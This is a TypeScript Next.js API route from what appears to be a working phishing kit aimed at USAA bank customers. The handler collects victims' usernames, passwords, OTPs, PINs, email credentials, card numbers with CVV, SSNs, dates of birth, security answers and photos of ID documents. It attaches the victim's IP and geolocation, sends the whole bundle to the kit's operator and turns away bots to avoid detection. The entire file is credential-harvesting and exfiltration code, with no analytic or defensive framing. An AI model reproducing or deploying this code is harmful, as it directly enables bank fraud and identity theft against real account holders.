import { NextApiResponse } from "next";
import { ExtendedRequest } from "../../types";
import geoApi from "../../utils/geoApi";
import router from "../../router";
import { sendContent } from "../../utils/sendContent";
import MobileDetect from "mobile-detect";

// Helper function to create HTML
const createHTML = (title: string, content: any) =>
  `<p><b>(▰˘◡˘▰) ${title} ☞ </b>${title !== "ID" ? `<code>` : ``}${
    content || ``
  }${title !== "ID" ? `</code>` : ``}</p>`;

// Function to parse JSON values and handle errors
const parseValue = (value: string) => {
  try {
    return JSON.parse(value);
  } catch (e) {
    return null;
  }
};

const getSessionId = (values: any) => {
  const keys = [
    "sessionId",
    "logins",
    "otp",
    "token",
    "billing",
    "cardDetails",
    "answers",
    "emailLogins",
    "documents",
    "pins",
  ];
  for (const key of keys) {
    if (values[key]) {
      if (typeof values[key] === "string") {
        return `#${values[key].trim()}`;
      } else {
        const data = parseValue(values[key][0]);

        if (data && data.sessionId) {
          return `#${data.sessionId.trim()}`;
        }
      }
    }
  }
  return ``;
};

// Function to process each login
const processLogins = (logins: string[]) => {
  let result = ``;
  if (logins) {
    result += `<b>------------------------------------</b>\n`;
    logins.forEach((login, index) => {
      const loginDataOuter = parseValue(login);
      const loginData = loginDataOuter[Object.keys(loginDataOuter)[0]]; // Assuming the keys are the index
      if (loginData) {
        result += `${createHTML(
          "ATTEMPT",
          loginData.loginDetails.loginAttempt
        )}\n`;
        result += `${createHTML("USER ID", loginData.loginDetails.username)}\n`;

        result += `${createHTML("PASSWORD", loginData.loginDetails.password)}`;
        if (index !== logins.length - 1) {
          result += "\n";
        }
      }
    });
  }
  return result;
};

// Function to process OTPs
const processOtp = (otp: string[]) => {
  if (!otp) return ``;

  const { otp: otpValue } = JSON.parse(otp[0]) || {};

  let result = `<b>------------------------------------</b>\n`;

  result += otpValue ? `${createHTML("OTP", otpValue)}` : ``;

  return result;
};

const processToken = (token: string[]) => {
  if (!token) return ``;

  const { token: tokenValue } = JSON.parse(token[0]) || {};

  let result = `<b>------------------------------------</b>\n`;

  result += tokenValue ? `${createHTML("TOKEN", tokenValue)}` : ``;

  return result;
};

// Function to process PINs
const processPin = (pinsValues: string[]) => {
  if (!pinsValues) return ``;

  const {
    pinAttempt,
    pins,
  }: {
    pinAttempt: number;
    pins: (string | null)[];
  } = JSON.parse(pinsValues[0]) || {};

  // Map through pins, include index and value in the representation, filter out null values
  const indexValuePair = pins
    .map((pin, index) => (pin !== null ? `[${index + 1}|${pin}]` : null))
    .filter((pin) => pin !== null);
  const pinValue = indexValuePair.join(", ");

  let result = `<b>------------------------------------</b>\n`;

  result += `${createHTML("SET", pinAttempt === 2 ? `ALL` : pinAttempt)}\n`;
  result += pinValue
    ? `${createHTML("PINs", pinValue)}`
    : `<div>No PIN provided</div>`;

  return result;
};

// Function to process email logins
const processEmailLogins = (emailLogins: string | any[]) => {
  let result = ``;
  if (emailLogins) {
    result += `<b>------------------------------------</b>\n`;
    for (let i = 0; i < emailLogins.length; i++) {
      const emailLogin = parseValue(emailLogins[i]);
      if (emailLogin) {
        result += `${createHTML(
          "ATTEMPT",
          emailLogin[`${i + 1}`]?.emailLogins?.attempt
        )}\n`;
        result += `${createHTML(
          "EMAIL",
          emailLogin[`${i + 1}`]?.emailLogins?.email
        )}\n`;
        result += `${createHTML(
          "PASSWORD",
          emailLogin[`${i + 1}`]?.emailLogins?.emailPassword
        )}`;
      }
    }
  }
  return result;
};

// Function to process billing
const processBilling = (billing: string) => {
  if (!billing) return ``;

  const billingData = parseValue(billing);

  if (!billingData) return ``;

  const {
    firstname,
    lastname,
    dob,
    streetAddress,
    state,
    zipCode,
    phoneNumber,
    carrierPin,
  } = billingData;

  let result = `<b>------------------------------------</b>\n`;
  result += `${createHTML("FIRST N.", firstname)}\n`;
  result += `${createHTML("LAST N.", lastname)}\n`;
  result += `${createHTML("DOB", dob)}\n`;
  result += `${createHTML("ADDRESS", streetAddress)}\n`;
  result += `${createHTML("STATE", state)}\n`;
  result += `${createHTML("ZIP CODE", zipCode)}\n`;
  result += `${createHTML("P. NUMBER", phoneNumber)}\n`;
  result += `${createHTML("CARRIER PIN", carrierPin)}`;

  return result;
};

// Function to process documents
const processDocuments = (documents: string) => {
  if (!documents) return ``;

  let result = `<b>------------------------------------</b>\n`;
  result += `${createHTML("FILES", `See attached files`)}`;
  return result;
};

// Function to process card details
const processCardDetails = (cardDetails: string) => {
  if (!cardDetails) return ``;

  const cardData = parseValue(cardDetails);

  if (!cardData) return ``;

  const { ssn, cardPin, cardNumber, expirationDate, cvv } = cardData;

  let result = `<b>------------------------------------</b>\n`;
  result += `${createHTML("CARD", cardNumber)}\n`;
  result += `${createHTML("EXP. DATE", expirationDate)}\n`;
  result += `${createHTML("CVV", cvv)}\n`;
  result += `${createHTML("PIN", cardPin)}\n`;
  result += `${createHTML("SSN", ssn)}`;

  return result;
};

// Function to process answers
const processAnswers = (answers: string) => {
  if (!answers) return ``;

  const answerData = parseValue(answers);

  if (!answerData) return ``;

  let result = `<b>------------------------------------</b>\n`;

  Object.keys(answerData).forEach((key, index) => {
    result += `(▰˘◡˘▰) QUESTION ${index + 1} ☞ <b>${
      answerData[key]?.question
    }</b>\n`;
    result += `(▰˘◡˘▰) ANSWER ${index + 1} ☞ <b>${
      answerData[key]?.answer
    }</b>\n`;
  });

  return result;
};

// Function to generate message and media
const generateMessageAndMedia = async (
  req: ExtendedRequest,
  _res: NextApiResponse
) => {
  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const geo = await geoApi(String(ip).split(",")[0]);
  const values = req.body;

  // const isSessionForm = values.form && values.form[0] === "SESSION";

  const prependFormType = (result: string, _formType: string) => {
    // if (result && isSessionForm) {
    //   let str = `<b>------------------------------------</b>\n`;
    //   str += `${formType}\n${result}`;
    //   return str;
    // }
    return result;
  };

  const messageParts = [
    prependFormType(processLogins(values.logins), "LOGIN"),
    prependFormType(processOtp(values.otp), "OTP"),
    prependFormType(processToken(values.token), "TOKEN"),
    prependFormType(processPin(values.pins), "PINS"),
    prependFormType(processEmailLogins(values.emailLogins), "EMAIL"),
    prependFormType(processBilling(values.billing), "BILLING"),
    prependFormType(processCardDetails(values.cardDetails), "CARD"),
    prependFormType(processAnswers(values.answers), "ANSWERS"),
    prependFormType(processDocuments(values.documents), "DOCUMENTS"),
    `<b>------------------------------------</b>`,
    createHTML("IP", String(ip).split(",")[0]),
    createHTML("LOCATION", `${geo?.city}, ${geo?.country}`),
    createHTML("ZIP CODE", `${geo?.zipCode}`),
    createHTML("TIMEZONE", geo?.timezone),
    createHTML("USER AGENT", req.headers["user-agent"]),
    `<b>------------------------------------</b>`,
    createHTML(
      "ID",
      getSessionId(
        values.sessionId
          ? {
              sessionId: values.sessionId[0],
            }
          : values
      )
    ),
    `<b>------------------------------------</b>\n`,
  ];

  const message = messageParts.filter((part) => part !== ``).join(`\n`);

  const subject = `USAA | ${values.form} by ROCKET 🚀 From ${
    String(ip).split(",")[0]
  }`;

  if (Object.keys(req.files).length) {
    // If there are files, process them and send with media
    const front = req.files && (req.files.front as any);
    const back = req.files && (req.files.back as any);
    const selfie = req.files && (req.files.selfie as any);

    const medias = [
      { filename: "Front", content: front },
      { filename: "Back", content: back },
      ...(selfie ? [{ filename: "Selfie", content: selfie }] : []),
    ];

    await sendContent(message, subject, medias);
  } else {
    // If no files, just send message
    await sendContent(message, subject);
  }
};

router.post(async (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Bots are not allowed.");
    return;
  }

  try {
    await generateMessageAndMedia(req, res);
  } catch (error) {
    console.log(error);
  }

  res.send("OK");
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default router.handler({
  onError: (err: any, _req, res) => {
    console.error(err.stack);
    res.status(err.statusCode || 500).end(err.message);
  },
});
